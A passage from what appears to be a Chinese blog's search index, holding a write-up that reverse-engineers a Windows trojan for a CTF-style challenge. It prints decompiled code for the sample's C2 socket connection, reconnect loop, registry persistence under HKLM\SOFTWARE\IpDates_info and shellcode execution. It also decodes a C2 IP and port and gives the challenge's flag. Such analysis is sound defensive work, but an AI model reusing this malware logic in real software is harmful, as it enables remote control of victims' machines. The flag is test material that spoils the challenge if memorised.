&quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; 注册表确实有东西但是我现在也不知道这个是干啥用的解码后就只有这个Ipdatetime(9-27-1-25-18) 这个函数 sub_140008750 是 木马的配置解析初始化函数，核心作用是：从「内置硬编码字符串」或「Windows 注册表」中读取配置信息，解析后设置一系列功能开关（全局变量），仅在程序启动时执行一次（通过标志位控制）黑客植入的恶意程序中「读取控制配置」的模块，解析是否启用远控、数据上传、端口转发等功能的开关 上面图片”|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|”这里可以得到5202是混淆后的时间就是2025年11月9日 查看sub_140003390函数的反编译结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889char __fastcall cyber(char *ArgList, LPCWCH lpWideCharStr, u_short hostshort){ // ArgList: 指向一个结构体的指针，用于存储连接状态和句柄。 // lpWideCharStr: 指向宽字符字符串 (Unicode)，包含目标 HOSTNAME（主机名）。 // hostshort: 目标 PORT（端口号），为主机字节序。 SOCKET v6; // 用于存储新的套接字句柄 // ... 其他局部变量 // --- 状态初始化和重置 --- ResetEvent(*((HANDLE *)ArgList + 1)); // 重置 ArgList 结构体中的一个同步事件句柄 _InterlockedExchange((volatile __int32 *)ArgList + 8, 0); // 原子地设置 ArgList 中偏移量 +8 处的标志为 0 (例如：连接状态为“正在连接”) *((_DWORD *)ArgList + 7) = timeGetTime(); // 记录当前时间 (偏移量 +7) // ... ArgList 结构体的其他初始化和设置 // --- 1. 创建套接字 (Socket) --- v6 = socket(2, 1, 6); // 创建新的套接字：AF_INET (2, IPv4), SOCK_STREAM (1, TCP流), IPPROTO_TCP (6) -&gt; TCP/IPv4 *((_QWORD *)ArgList + 22) = v6; // 将新的套接字句柄存储在 ArgList 结构体的偏移量 +22 处 if ( v6 == -1 ) // 检查套接字创建是否失败 return 0; // --- 2. 转换主机名 (宽字符到多字节) --- cchWideChar = lstrlenW(lpWideCharStr); // 获取宽字符主机名字符串的长度 // 确定多字节字符串所需的缓冲区大小 cbMultiByte_1 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, 0, 0, 0, 0); cbMultiByte = cbMultiByte_1; lpMultiByteStr = (CHAR *)operator new(cbMultiByte_1 + 1); // 分配内存用于多字节字符串 (+1 用于空终止符) cchWideChar_1 = lstrlenW(lpWideCharStr); // 执行实际的转换：从宽字符到多字节 WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar_1, lpMultiByteStr, cbMultiByte, 0, 0); lpMultiByteStr[cbMultiByte] = 0; // 空终止多字节字符串 // --- 3. 解析主机名到 IP 地址 (DNS Lookup) --- hostbyname = gethostbyname(lpMultiByteStr); // 执行 DNS 查询，将主机名解析为 IP 地址 j_free(lpMultiByteStr); // 释放分配的多字节字符串缓冲区 if ( !hostbyname ) // 检查 DNS 解析是否失败 return 0; // --- 4. 准备目标地址结构体 (sockaddr_in) --- name.sa_family = 2; // 设置地址族为 AF_INET (IPv4) // 设置端口号：将 hostshort (主机字节序) 转换为网络字节序 *(_WORD *)name.sa_data = htons(hostshort); s = *((_QWORD *)ArgList + 22); // 获取套接字句柄 // 设置 IP 地址：获取 h_addr_list 指针数组中的第一个地址 *(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; // --- 5. 建立连接 (TCP Handshake) --- if ( connect(s, &amp;name, 16) == -1 ) // 尝试建立 TCP 连接 return 0; // --- 6. 配置套接字选项 (setsockopt) --- // 设置 SO_RCVBUF (接收缓冲区大小, 4097) 为 0x40000 (256 KB) s_1 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval = 0x40000; setsockopt(s_1, 0xFFFF, 4097, optval, 4); // 0xFFFF 是 SOL_SOCKET (套接字级别) // 设置 SO_SNDBUF (发送缓冲区大小, 4098) 为 0x40000 (256 KB) s_2 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval = 0x40000; setsockopt(s_2, 0xFFFF, 4098, optval, 4); // 设置 SO_SNDTIMEO (发送超时, 4102) 为 30000 毫秒 (30 秒) s_3 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval_ = 30000; setsockopt(s_3, 0xFFFF, 4102, optval_, 4); // 设置 SO_KEEPALIVE (启用保持活动机制, 8) 为 1 s_5 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval__1 = 1; if ( !setsockopt(s_5, 0xFFFF, 8, optval__1, 4) ) { // 如果 SO_KEEPALIVE 设置成功，则配置 Keep-Alive 定时参数 s_4 = *((_QWORD *)ArgList + 22); vInBuffer[0] = 1; // 开关 (1: 启用) vInBuffer[1] = 180000; // 保持活动时间 (180 秒 或 3 分钟) vInBuffer[2] = 5000; // 保持活动间隔 (5 秒) // 使用 WSAIoctl 和 SIO_KEEPALIVE_VALS (0x98000004) 设置自定义 Keep-Alive 参数 WSAIoctl(s_4, 0x98000004, vInBuffer, 0xCu, 0, 0, &amp;cbBytesReturned, 0, 0); } // --- 7. 更新状态并创建工作线程 --- _InterlockedExchange((volatile __int32 *)ArgList + 8, 1); // 原子地设置连接状态标志为 1 (例如：已连接) ThrdAddr = 0; // 创建一个线程 (例如：接收/读取线程) *((_QWORD *)ArgList + 20) = beginthreadex(0, 0, sub_140003690, ArgList, 0, &amp;ThrdAddr); ThrdAddr_ = 0; // 创建第二个线程 (例如：发送/写入线程或心跳线程) *((_QWORD *)ArgList + 21) = beginthreadex(0, 0, sub_1400037E0, ArgList, 0, &amp;ThrdAddr_); return 1; // 成功} sub_140003390函数是 Windows 环境中建立出站 TCP 网络连接的常见模式 1通过 *(_WORD *)name.sa_data = htons(hostshort); 将其转换为网络字节序并设置为socket连接端口 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101name.sa_family = 2; // AF_INET*(_WORD *)name.sa_data = htons(hostshort); // 端口号 (网络字节序)*(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; // IP地址// Hidden C++ exception states: #wind=2void __fastcall __noreturn sub_7FF6175EA440(LPVOID lpThreadParameter){ int v1; // eax __int64 v2; // rdi void *v3; // rax __int64 v4; // rbp void *v5; // rax __int64 v6; // rsi int v7; // r11d int v8; // eax void (__fastcall **v9)(_QWORD); // rbx unsigned int v10; // eax int v11; // ebx _QWORD v12[2]; // [rsp+38h] [rbp-60h] BYREF int v13; // [rsp+48h] [rbp-50h] HANDLE hObject; // [rsp+50h] [rbp-48h] int v15; // [rsp+60h] [rbp-38h] HANDLE hHandle; // [rsp+68h] [rbp-30h] void *v17; // [rsp+A8h] [rbp+10h] BYREF CreateThread(0, 0, StartAddress, 0, 0, 0); CreateThread(0, 0, sub_7FF6175EA3E0, 0, 0, 0); v1 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB2C); Sleep(1000 * v1); v2 = 0; v3 = operator new(0xB8u); if ( v3 ) v4 = sub_7FF6175E3230(v3); else v4 = 0; v5 = operator new(0x368u); v17 = v5; if ( v5 ) v6 = sub_7FF6175E7690(v5); else v6 = 0; while ( 1 ) { sub_7FF6175E3210(); if ( byte_7FF61763E99E ) { wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;8888&quot;); // &quot;6666&quot; v7 = dword_7FF61763F8E8; } else { wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;6666&quot;); // &quot;6666&quot; v7 = dword_7FF61763F6A8; } byte_7FF61763E99E = byte_7FF61763E99E == 0; dword_7FF61763E550 = v7; if ( ++dword_7FF61763F3F4 == 200 ) { sub_7FF6175E3210(); wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;80&quot;); // &quot;6666&quot; v7 = dword_7FF61763FB28; dword_7FF61763E550 = dword_7FF61763FB28; dword_7FF61763F3F4 = 0; } if ( v2 ) { (**(void (__fastcall ***)(__int64))v2)(v2); v7 = dword_7FF61763E550; } v2 = v6; if ( v7 == 1 ) v2 = v4; v8 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB68); Sleep(1000 * v8); v9 = *(void (__fastcall ***)(_QWORD))v2; v10 = sub_7FF6175EC5F8(a6666); // &quot;6666&quot; if ( ((unsigned __int8 (__fastcall *)(__int64, wchar_t *, _QWORD))v9[4])(v2, a127001, v10) )// &quot;127.0.0.1&quot; { v11 = dword_7FF61763FCE8; v12[0] = &amp;CManager::`vftable'; v12[1] = v2; (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v2 + 24LL))(v2, v12); hObject = CreateEventA(0, 1, 0, 0); v13 = 0; v12[0] = &amp;CKernelManager::`vftable'; hHandle = 0; v15 = v11; LOWORD(v17) = 260; (*(void (__fastcall **)(__int64, void **, __int64))(*(_QWORD *)v2 + 16LL))(v2, &amp;v17, 2); (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 40LL))(v2); WaitForSingleObject(hHandle, 0xFFFFFFFF); v12[0] = &amp;CKernelManager::`vftable'; CloseHandle(hHandle); v12[0] = &amp;CManager::`vftable'; CloseHandle(hObject); } }}这是一个无限循环的线程函数 sub_7FF6175EA440 ，负责建立与C&amp;C服务器的连接并执行后续操作。函数使用 __noreturn 声明，表示它永远不会返回 这里发现了一些信息我们copy下来看一下 这些全是TCP 协议底层日志，说明程序不是简单调用系统 TCP 接口，而是实现了自定义的 TCP 通信（常见于木马 / 远控程序，用于稳定和控制端交互） 字符串 含义（通俗解释） 排查价值 recv sn=%lu 接收 TCP 数据包，记录「序列号（sn）」 证明程序在和外部（如黑客服务器）进行 TCP 数据交互，sn 是数据包有序传输的标识 input ack: sn=%lu rtt=%ld rto=%ld 收到 TCP 确认包（ACK），记录序列号、往返时间（rtt）、重传超时（rto） 木马为了保证 C2 连接稳定，会动态调整 rto（避免连接断开），是主动通信的铁证 input psh: sn=%lu ts=%lu 收到 TCP 推送包（PSH），记录序列号和时间戳（ts） PSH 包用于「强制立即传输数据」，常见于黑客发送控制指令、接收窃取数据时 input probe 收到 TCP 探测包 黑客可能在通过探测包检测你的主机是否在线、连接是否存活 input wins: %lu 记录 TCP 窗口大小（wins） 优化数据传输效率，进一步证明是「持续双向通信」（而非单次请求） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465data:000000014001DBB8 aRoLdBytes db '[RO] %ld bytes',0 ; DATA XREF: sub_140001740+2E↑o.rdata:000000014001DBB8 ; sub_140002880+14A↑o ....rdata:000000014001DBC7 align 8.rdata:000000014001DBC8 aRecvSnLu db 'recv sn=%lu',0 ; DATA XREF: sub_140001B70+FF↑o.rdata:000000014001DBD4 align 8.rdata:000000014001DBD8 aRiDBytes db '[RI] %d bytes',0 ; DATA XREF: sub_140002390+3A↑o.rdata:000000014001DBE6 align 8.rdata:000000014001DBE8 aInputAckSnLuRt db 'input ack: sn=%lu rtt=%ld rto=%ld',0.rdata:000000014001DBE8 ; DATA XREF: sub_140002390+271↑o.rdata:000000014001DC0A align 10h.rdata:000000014001DC10 aInputPshSnLuTs db 'input psh: sn=%lu ts=%lu',0.rdata:000000014001DC10 ; DATA XREF: sub_140002390+2AE↑o.rdata:000000014001DC29 align 10h.rdata:000000014001DC30 aInputProbe db 'input probe',0 ; DATA XREF: sub_140002390+375↑o.rdata:000000014001DC3C align 20h.rdata:000000014001DC40 aInputWinsLu db 'input wins: %lu',0 ; DATA XREF: sub_140002390+39E↑o.rdata:000000014001DC50 dq offset ??_R4CManager@@6B@ ; const CManager::`RTTI Complete Object Locator'.rdata:000000014001DC58 ; const CManager::`vftable'.rdata:000000014001DC58 ??_7CManager@@6B@ dq offset nullsub_2 ; DATA XREF: sub_140006E50+27↑o.rdata:000000014001DC58 ; sub_140006EB0+21↑o ....rdata:000000014001DC60 dq offset ??_R4CTcpSocket@@6B@ ; const CTcpSocket::`RTTI Complete Object Locator'.rdata:000000014001DC68 ; const CTcpSocket::`vftable'.rdata:000000014001DC68 ??_7CTcpSocket@@6B@ dq offset sub_140003310.rdata:000000014001DC68 ; DATA XREF: sub_140003230+21↑o.rdata:000000014001DC70 dq offset sub_140005A30.rdata:000000014001DC78 dq offset sub_140003860.rdata:000000014001DC80 dq offset ?swfun@std@@YAXAEAVios_base@1@_J@Z ; std::swfun(std::ios_base &amp;,__int64).rdata:000000014001DC88 dq offset sub_140003390.rdata:000000014001DC90 dq offset sub_140003C10.rdata:000000014001DC98 unk_14001DC98 db 0 ; DATA XREF: sub_140009460+61↑o.rdata:000000014001DC99 db 0.rdata:000000014001DC9A db 0.rdata:000000014001DC9B db 0.rdata:000000014001DC9C db 0.rdata:000000014001DC9D db 0.rdata:000000014001DC9E db 0.rdata:000000014001DC9F db 0.rdata:000000014001DCA0 aInvalidStringP db 'invalid string position',0.rdata:000000014001DCA0 ; DATA XREF: sub_1400066C0+1C↑o.rdata:000000014001DCA0 ; sub_1400067F0+27↑o ....rdata:000000014001DCB8 aStringTooLong db 'string too long',0 ; DATA XREF: sub_1400067F0+71↑o.rdata:000000014001DCB8 ; sub_140006920+8D↑o ....rdata:000000014001DCC8 align 10h.rdata:000000014001DCD0 ; const WCHAR aD33f351a4aeea5.rdata:000000014001DCD0 aD33f351a4aeea5: ; DATA XREF: sub_140006EF0+8D↑o.rdata:000000014001DCD0 ; sub_140006EF0+F2↑o ....rdata:000000014001DCD0 text &quot;UTF-16LE&quot;, 'd33f351a4aeea5e608853d1a56661059',0.rdata:000000014001DD12 align 8.rdata:000000014001DD18 aDenglupeizhi db 'denglupeizhi',0 ; DATA XREF: sub_140007500+23↑o.rdata:000000014001DD25 align 8.rdata:000000014001DD28 ; const WCHAR SubKey.rdata:000000014001DD28 SubKey: ; DATA XREF: sub_140006D20+40↑o.rdata:000000014001DD28 text &quot;UTF-16LE&quot;, 'SOFTWARE',0.rdata:000000014001DD3A align 20h.rdata:000000014001DD40 ; const WCHAR ValueName.rdata:000000014001DD40 ValueName: ; DATA XREF: sub_140006D20+67↑o.rdata:000000014001DD40 ; sub_140006D20+79↑o.rdata:000000014001DD40 text &quot;UTF-16LE&quot;, 'IpDates_info',0.rdata:000000014001DD5A align 20h.rdata:000000014001DD60 ; const WCHAR aConsole1.rdata:000000014001DD60 aConsole1: ; DATA XREF: sub_140006EF0+39↑o.rdata:000000014001DD60 ; sub_140006EF0+367↑o.rdata:000000014001DD60 text &quot;UTF-16LE&quot;, 'Console\\1',0.rdata:000000014001DD74 align 8.rdata:000000014001DD78 aWindowsSystem3 db 'Windows\\System32\\tracerpt.exe',0 denglupeizhi（中文拼音：「登录配置」） 含义：程序的核心配置项（大概率存储 C2 服务器 IP、端口、登录密码 / 密钥）； 排查操作：在系统中搜索这个字符串（如注册表、本地配置文件），可能找到明文 / 加密的 C2 配置。 1234567891011121314151617181920212223242526272829__int64 __fastcall sub_140007500(int a1){ unsigned int v1; // r10d __int64 v2; // r9 int n12_1; // r8d __int64 n12; // rdx v1 = 0; v2 = 0; if ( a1 &lt;= 0 ) return 0xFFFFFFFFLL; while ( 1 ) { n12_1 = 0; for ( n12 = 0; n12 &lt; 12; ++n12 ) { if ( *((_BYTE *)lpBuffer + v2 + n12) != aDenglupeizhi[n12] ) break; ++n12_1; } if ( n12_1 == 12 ) break; ++v2; ++v1; if ( v2 &gt;= a1 ) return 0xFFFFFFFFLL; } return v1;} 这个函数也挺关键的 然后xfer到下面这个函数 12345678910111213141516171819202122232425262728293031323334353637__int64 __fastcall sub_140006D20(_DWORD *a1){ unsigned int v2; // eax HANDLE hProcess; // rax _QWORD v5[2]; // [rsp+30h] [rbp-28h] BYREF DWORD dwProcessId[6]; // [rsp+40h] [rbp-18h] DWORD ExitCode; // [rsp+60h] [rbp+8h] BYREF HKEY hKey; // [rsp+68h] [rbp+10h] BYREF v2 = sub_140007500(dword_14005EBB8); if ( v2 != -1 ) memmove((char *)lpBuffer + v2, &amp;Src, 0x12A0u); RegOpenKeyExW(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE&quot;, 0, 0x102u, &amp;hKey); RegDeleteValueW(hKey, L&quot;IpDates_info&quot;); RegSetValueExW(hKey, L&quot;IpDates_info&quot;, 0, 3u, &amp;Src, 0x12A0u); RegCloseKey(hKey); if ( a1[10] ) { v5[0] = 0; v5[1] = 0; *(_QWORD *)dwProcessId = 0; while ( 1 ) { while ( !(unsigned int)sub_140007310((unsigned int)dword_14005EBB8, v5) ) ; while ( 1 ) { hProcess = OpenProcess(0x400u, 0, dwProcessId[0]); if ( !hProcess || !GetExitCodeProcess(hProcess, &amp;ExitCode) || ExitCode != 259 ) break; Sleep(0xBB8u); } } } ((void (*)(void))lpBuffer)(); return 0;} 上面的代码负责配置的更新与持久化，又负责核心恶意代码的执行，是整个攻击链条的关键 1启动 → 读取旧配置（IpDates_info）→ 调用sub_140007500查找配置位置 → 用Src更新配置 → 写入注册表持久化 → 监控目标进程状态 → 执行核心恶意代码（C2连接+攻击） 由下面这个就可以去查一下注册表了这里查注册表发现了ipdateinfo在HKEY_LOCAL_MACHINE\\SOFTWARE发现了信息这就很关键了 这里导出来看一眼，注册表文件内容转成txt了，怕你们乱点给自己电脑搞坏了，那估计只能重装了 注册表数据是 UTF-16LE 编码（Windows 注册表字符串默认编码），大量 00 是编码空字节，关键信息如下： 解码后的明文信息 对应十六进制片段（示例） 含义（木马配置作用） 115.190.102.32 31,00,31,00,35,00,2e,00,31,00,39,00,30,00,2e,00,31,00,30,00,32,00,2e,00,33,00,32,00 木马的 C2 服务器 IP，就是我的远程服务器 6000 36,00,30,00,30,00,30,00 C2 服务器的 监听端口，对应 TCP 连接的 6000 端口，是木马和黑客通信的核心端口 127.0.0.1 31,00,32,00,37,00,2e,00,30,00,2e,00,30,00,2e,00,31,00 木马的 本地监听 IP（回环地址），估计是用于本地进程通信或反向代理（隐藏自身行为） 80 38,00,30,00 本地监听端口（80 端口，模拟 HTTP 服务，规避防火墙检测） 1.0 31,00,2e,00,30,00 木马版本号（简单标识版本，无特殊技术意义） 2025.11. 9 32,00,30,00,32,00,35,00,2e,00,31,00,31,00,2e,00,20,00,39,00 配置更新日期（生成配置的时间，用于版本管理） 1（多个零散出现） 01,00,00,00 或 31,00 功能开关（对应之前逆向的 dword_14005F6A8 等变量，1=启用，比如启用 C2 连接、本地监听） 这里可以看到日期 当然这分析出来的只是服务器IP并不是真正的后门IP，这也可以作为木马分析1的题解，面对找不到进程或者任何关于木马的特征的情况可以这样操作，可以这样分析 去看一眼开机自启动注册表没发现什么奇怪的 shift+F12然后搜索到了.com的域名，这个很大可能就是开发c2工具的黑产团伙留下的后门域名，我们查一下域名 直接问ai懒得搜了 yk.ggdy.com md5值：af71b4482bc8e659e1c2a092a910d4ec 所以最终flag就是{yk.ggdy.com:2025年11月9日} 最后查一下这个IP在哪里 https://ipconfig.com/zh","link":"/2025/12/11/%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"}],"tags":[{"name":"java，代码审计","slug":"java，代码审计","link":"/tags/java%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"web安全","slug":"web安全","link":"/tags/web%E5%AE%89%E5%85%A8/"}],"categories":[{"name":"代码审计","slug":"代码审计","link":"/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"waf绕过","slug":"waf绕过","link":"/categories/waf%E7%BB%95%E8%BF%87/"}],"pages":[{"title":"","text":"google-site-verification: google0ce01516f2d5551f.html","link":"/static/google0ce01516f2d5551f.html"},{"title":"categories","text":"","link":"/categories/index.html"}]}